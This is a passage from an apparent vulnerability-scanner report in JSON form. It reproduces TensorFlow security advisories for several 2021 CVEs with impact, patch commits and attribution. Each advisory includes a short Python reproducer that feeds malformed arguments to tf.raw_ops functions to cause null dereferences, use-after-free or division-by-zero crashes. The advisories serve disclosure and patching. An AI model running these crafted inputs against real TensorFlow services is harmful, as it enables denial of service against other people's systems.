                "text": "Vulnerability CVE-2021-37676\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37676](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37676)\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.SparseFillEmptyRows`:\n\n```python\nimport tensorflow as tf\n  \ntf.compat.v1.disable_v2_behavior()\ntf.raw_ops.SparseFillEmptyRows(\n  indices = tf.constant([], shape=[0, 0], dtype=tf.int64),\n  values = tf.constant([], shape=[0], dtype=tf.int64),\n  dense_shape = tf.constant([], shape=[0], dtype=tf.int64),\n  default_value = 0)\n```\n  \nThe shape inference [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/ops/sparse_ops.cc#L608-L634) does not validate that the input arguments are not empty tensors.\n\n### Patches \nWe have patched the issue in GitHub commit [578e634b4f1c1c684d4b4294f9e5281b2133b3ed](https://github.com/tensorflow/tensorflow/commit/578e634b4f1c1c684d4b4294f9e5281b2133b3ed).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security",
                "markdown": "**Vulnerability CVE-2021-37676**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37676](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37676)|\n\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.SparseFillEmptyRows`:\n\n```python\nimport tensorflow as tf\n  \ntf.compat.v1.disable_v2_behavior()\ntf.raw_ops.SparseFillEmptyRows(\n  indices = tf.constant([], shape=[0, 0], dtype=tf.int64),\n  values = tf.constant([], shape=[0], dtype=tf.int64),\n  dense_shape = tf.constant([], shape=[0], dtype=tf.int64),\n  default_value = 0)\n```\n  \nThe shape inference [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/ops/sparse_ops.cc#L608-L634) does not validate that the input arguments are not empty tensors.\n\n### Patches \nWe have patched the issue in GitHub commit [578e634b4f1c1c684d4b4294f9e5281b2133b3ed](https://github.com/tensorflow/tensorflow/commit/578e634b4f1c1c684d4b4294f9e5281b2133b3ed).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security"
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37643",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37643"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37643",
              "help": {
                "text": "Vulnerability CVE-2021-37643\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37643](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37643)\n### Impact\nIf a user does not provide a valid padding value to `tf.raw_ops.MatrixDiagPartOp`, then the code triggers a null pointer dereference (if input is empty) or produces invalid behavior, ignoring all values after the first:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.MatrixDiagPartV2(\n  input=tf.ones(2,dtype=tf.int32),\n  k=tf.ones(2,dtype=tf.int32),\n  padding_value=[])\n```\n\nAlthough this example is given for `MatrixDiagPartV2`, all versions of the operation are affected.\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/linalg/matrix_diag_op.cc#L89) reads the first value from a tensor buffer without first checking that the tensor has values to read from.\n\n### Patches\nWe have patched the issue in GitHub commit [482da92095c4d48f8784b1f00dda4f81c28d2988](https://github.com/tensorflow/tensorflow/commit/482da92095c4d48f8784b1f00dda4f81c28d2988).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37643**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37643](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37643)|\n\n### Impact\nIf a user does not provide a valid padding value to `tf.raw_ops.MatrixDiagPartOp`, then the code triggers a null pointer dereference (if input is empty) or produces invalid behavior, ignoring all values after the first:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.MatrixDiagPartV2(\n  input=tf.ones(2,dtype=tf.int32),\n  k=tf.ones(2,dtype=tf.int32),\n  padding_value=[])\n```\n\nAlthough this example is given for `MatrixDiagPartV2`, all versions of the operation are affected.\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/linalg/matrix_diag_op.cc#L89) reads the first value from a tensor buffer without first checking that the tensor has values to read from.\n\n### Patches\nWe have patched the issue in GitHub commit [482da92095c4d48f8784b1f00dda4f81c28d2988](https://github.com/tensorflow/tensorflow/commit/482da92095c4d48f8784b1f00dda4f81c28d2988).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.7",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37652",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37652"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37652",
              "help": {
                "text": "Vulnerability CVE-2021-37652\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37652](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37652)\n### Impact\nThe implementation for `tf.raw_ops.BoostedTreesCreateEnsemble` can result in a use after free error if an attacker supplies specially crafted arguments:\n\n```python\nimport tensorflow as tf\n\nv= tf.Variable([0.0])\ntf.raw_ops.BoostedTreesCreateEnsemble(\n  tree_ensemble_handle=v.handle,\n  stamp_token=[0],\n  tree_ensemble_serialized=[`0`]) \n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/boosted_trees/resource_ops.cc#L55) uses a reference counted resource and decrements the refcount if the initialization fails, as it should. However, when the code was written, the  resource was represented as a naked pointer but later refactoring has changed it to be a smart pointer. Thus, when the pointer leaves the scope, a subsequent `free`-ing of the resource occurs, but this fails to take into account that the refcount has already reached 0, thus the resource has been already freed. During this double-free process, members of the resource object are accessed for cleanup but they are invalid as the entire resource has been freed.\n\n### Patches\nWe have patched the issue in GitHub commit [5ecec9c6fbdbc6be03295685190a45e7eee726ab](https://github.com/tensorflow/tensorflow/commit/5ecec9c6fbdbc6be03295685190a45e7eee726ab).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37652**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37652](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37652)|\n\n### Impact\nThe implementation for `tf.raw_ops.BoostedTreesCreateEnsemble` can result in a use after free error if an attacker supplies specially crafted arguments:\n\n```python\nimport tensorflow as tf\n\nv= tf.Variable([0.0])\ntf.raw_ops.BoostedTreesCreateEnsemble(\n  tree_ensemble_handle=v.handle,\n  stamp_token=[0],\n  tree_ensemble_serialized=[`0`]) \n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/boosted_trees/resource_ops.cc#L55) uses a reference counted resource and decrements the refcount if the initialization fails, as it should. However, when the code was written, the  resource was represented as a naked pointer but later refactoring has changed it to be a smart pointer. Thus, when the pointer leaves the scope, a subsequent `free`-ing of the resource occurs, but this fails to take into account that the refcount has already reached 0, thus the resource has been already freed. During this double-free process, members of the resource object are accessed for cleanup but they are invalid as the entire resource has been freed.\n\n### Patches\nWe have patched the issue in GitHub commit [5ecec9c6fbdbc6be03295685190a45e7eee726ab](https://github.com/tensorflow/tensorflow/commit/5ecec9c6fbdbc6be03295685190a45e7eee726ab).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37660",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37660"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37660",
              "help": {
                "text": "Vulnerability CVE-2021-37660\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37660](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37660)\n### Impact\nAn attacker can cause a floating point exception by calling inplace operations with crafted arguments that would result in a division by 0:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.InplaceSub(x=[],i=[-99,-1,-1],v=[1,1,1])\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/inplace_ops.cc#L283) has a logic error: it should skip processing if `x` and `v` are empty but the code uses `||` instead of `\u0026\u0026`.\n\n### Patches\nWe have patched the issue in GitHub commit [e86605c0a336c088b638da02135ea6f9f6753618](https://github.com/tensorflow/tensorflow/commit/e86605c0a336c088b638da02135ea6f9f6753618).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37660**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37660](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37660)|\n\n### Impact\nAn attacker can cause a floating point exception by calling inplace operations with crafted arguments that would result in a division by 0:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.InplaceSub(x=[],i=[-99,-1,-1],v=[1,1,1])\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/inplace_ops.cc#L283) has a logic error: it should skip processing if `x` and `v` are empty but the code uses `||` instead of `\u0026\u0026`.\n\n### Patches\nWe have patched the issue in GitHub commit [e86605c0a336c088b638da02135ea6f9f6753618](https://github.com/tensorflow/tensorflow/commit/e86605c0a336c088b638da02135ea6f9f6753618).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37642",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37642"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37642",
              "help": {
                "text": "Vulnerability CVE-2021-37642\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37642](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37642)\n### Impact\nThe implementation of `tf.raw_ops.ResourceScatterDiv` is vulnerable to a division by 0 error:\n\n```python\nimport tensorflow as tf\n\nv= tf.Variable([1,2,3])\ntf.raw_ops.ResourceScatterDiv(\n  resource=v.handle,\n  indices=[1],\n  updates=[0])\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/resource_variable_ops.cc#L865) uses a common class for all binary operations but fails to treat the division by 0 case separately.\n\n### Patches\nWe have patched the issue in GitHub commit [4aacb30888638da75023e6601149415b39763d76](https://github.com/tensorflow/tensorflow/commit/4aacb30888638da75023e6601149415b39763d76).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37642**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37642](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37642)|\n\n### Impact\nThe implementation of `tf.raw_ops.ResourceScatterDiv` is vulnerable to a division by 0 error:\n\n```python\nimport tensorflow as tf\n\nv= tf.Variable([1,2,3])\ntf.raw_ops.ResourceScatterDiv(\n  resource=v.handle,\n  indices=[1],\n  updates=[0])\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/resource_variable_ops.cc#L865) uses a common class for all binary operations but fails to treat the division by 0 case separately.\n\n### Patches\nWe have patched the issue in GitHub commit [4aacb30888638da75023e6601149415b39763d76](https://github.com/tensorflow/tensorflow/commit/4aacb30888638da75023e6601149415b39763d76).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37640",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37640"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37640",
              "help": {
                "text": "Vulnerability CVE-2021-37640\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37640](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37640)\n### Impact\nThe implementation of `tf.raw_ops.SparseReshape` can be made to trigger an integral division by 0 exception:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SparseReshape(\n  input_indices = np.ones((1,3)),\n  input_shape = np.array([1,1,0]),\n  new_shape = np.array([1,0]))\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/reshape_util.cc#L176-L181) calls the reshaping functor whenever there is at least an index in the input but does not check that shape of the input or the target shape have both a non-zero number of elements.\n\nThe [reshape functor](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/reshape_util.cc#L40-L78) blindly divides by the dimensions of the target shape. Hence, if this is not checked, code will result in a division by 0.\n  \n### Patches\nWe have patched the issue in GitHub commit [4923de56ec94fff7770df259ab7f2288a74feb41](https://github.com/tensorflow/tensorflow/commit/4923de56ec94fff7770df259ab7f2288a74feb41).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1 as this is the other affected version.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37640**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37640](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37640)|\n\n### Impact\nThe implementation of `tf.raw_ops.SparseReshape` can be made to trigger an integral division by 0 exception:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SparseReshape(\n  input_indices = np.ones((1,3)),\n  input_shape = np.array([1,1,0]),\n  new_shape = np.array([1,0]))\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/reshape_util.cc#L176-L181) calls the reshaping functor whenever there is at least an index in the input but does not check that shape of the input or the target shape have both a non-zero number of elements.\n\nThe [reshape functor](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/reshape_util.cc#L40-L78) blindly divides by the dimensions of the target shape. Hence, if this is not checked, code will result in a division by 0.\n  \n### Patches\nWe have patched the issue in GitHub commit [4923de56ec94fff7770df259ab7f2288a74feb41](https://github.com/tensorflow/tensorflow/commit/4923de56ec94fff7770df259ab7f2288a74feb41).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1 as this is the other affected version.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37648",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37648"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37648",
              "help": {
                "text": "Vulnerability CVE-2021-37648\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37648](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37648)\n### Impact\nThe code for `tf.raw_ops.SaveV2` does not properly validate the inputs and an attacker can trigger a null pointer dereference:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SaveV2(\n  prefix=[`tensorflow`],\n  tensor_name=[`v`],\n  shape_and_slices=[],\n  tensors=[1,2,3])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/save_restore_v2_ops.cc) uses `ValidateInputs` to  check that the input arguments are valid. This validation would have caught the illegal state represented by the reproducer  above.\n\nHowever, the validation uses `OP_REQUIRES` which translates to setting the `Status` object of the current `OpKernelContext` to an error status, followed by an empty `return` statement which just terminates the execution of the function it is present in. However, this does not mean that the kernel execution is finalized: instead, execution continues from the next line in `Compute` that follows the call to `ValidateInputs`. This is equivalent to lacking the validation.\n      \n### Patches\nWe have patched the issue in GitHub commit [9728c60e136912a12d99ca56e106b7cce7af5986](https://github.com/tensorflow/tensorflow/commit/9728c60e136912a12d99ca56e106b7cce7af5986).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.                                                                                                                                                                                                                                               \n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37648**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37648](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37648)|\n\n### Impact\nThe code for `tf.raw_ops.SaveV2` does not properly validate the inputs and an attacker can trigger a null pointer dereference:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SaveV2(\n  prefix=[`tensorflow`],\n  tensor_name=[`v`],\n  shape_and_slices=[],\n  tensors=[1,2,3])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/save_restore_v2_ops.cc) uses `ValidateInputs` to  check that the input arguments are valid. This validation would have caught the illegal state represented by the reproducer  above.\n\nHowever, the validation uses `OP_REQUIRES` which translates to setting the `Status` object of the current `OpKernelContext` to an error status, followed by an empty `return` statement which just terminates the execution of the function it is present in. However, this does not mean that the kernel execution is finalized: instead, execution continues from the next line in `Compute` that follows the call to `ValidateInputs`. This is equivalent to lacking the validation.\n      \n### Patches\nWe have patched the issue in GitHub commit [9728c60e136912a12d99ca56e106b7cce7af5986](https://github.com/tensorflow/tensorflow/commit/9728c60e136912a12d99ca56e106b7cce7af5986).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.                                                                                                                                                                                                                                               \n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37668",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37668"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37668",
              "help": {
                "text": "Vulnerability CVE-2021-37668\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37668](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37668)\n### Impact\nAn attacker can cause denial of service in applications serving models using `tf.raw_ops.UnravelIndex` by triggering a division by 0:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.UnravelIndex(indices=-1, dims=[1,0,2])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/unravel_index_op.cc#L36) does not check that the tensor subsumed by `dims` is not empty. Hence, if one element of `dims` is 0, the implementation does a division by 0.\n\n### Patches\nWe have patched the issue in GitHub commit [a776040a5e7ebf76eeb7eb923bf1ae417dd4d233](https://github.com/tensorflow/tensorflow/commit/a776040a5e7ebf76eeb7eb923bf1ae417dd4d233).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37668**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37668](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37668)|\n\n### Impact\nAn attacker can cause denial of service in applications serving models using `tf.raw_ops.UnravelIndex` by triggering a division by 0:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.UnravelIndex(indices=-1, dims=[1,0,2])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/unravel_index_op.cc#L36) does not check that the tensor subsumed by `dims` is not empty. Hence, if one element of `dims` is 0, the implementation does a division by 0.\n\n### Patches\nWe have patched the issue in GitHub commit [a776040a5e7ebf76eeb7eb923bf1ae417dd4d233](https://github.com/tensorflow/tensorflow/commit/a776040a5e7ebf76eeb7eb923bf1ae417dd4d233).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37662",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37662"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37662",
              "help": {
                "text": "Vulnerability CVE-2021-37662\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37662](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37662)\n### Impact\nAn attacker can generate undefined behavior via a reference binding to nullptr in `BoostedTreesCalculateBestGainsPerFeature`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.BoostedTreesCalculateBestGainsPerFeature(\n  node_id_range=[],\n  stats_summary_list=[[1,2,3]],\n  l1=[1.0],\n  l2=[1.0],\n  tree_complexity =[1.0],\n  min_node_weight =[1.17],\n  max_splits=5)\n```\n\nA similar attack can occur in `BoostedTreesCalculateBestFeatureSplitV2`:\n\n```python\nimport tensorflow as tf\n                                                                                                                                                                                                                                                                                          \ntf.raw_ops.BoostedTreesCalculateBestFeatureSplitV2(\n  node_id_range=[],\n  stats_summaries_list=[[1,2,3]],\n  split_types=[``],\n  candidate_feature_ids=[1,2,3,4],\n  l1=[1],     \n  l2=[1],\n  tree_complexity=[1.0],\n  min_node_weight=[1.17],\n  logits_dimension=5)\n```     \n    \nThe  [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/stats_ops.cc) does not validate the input values.\n\n### Patches\nWe have patched the issue in GitHub commit [9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad](https://github.com/tensorflow/tensorflow/commit/9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad) and in commit. [429f009d2b2c09028647dd4bb7b3f6f414bbaad7](https://github.com/tensorflow/tensorflow/commit/429f009d2b2c09028647dd4bb7b3f6f414bbaad7).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
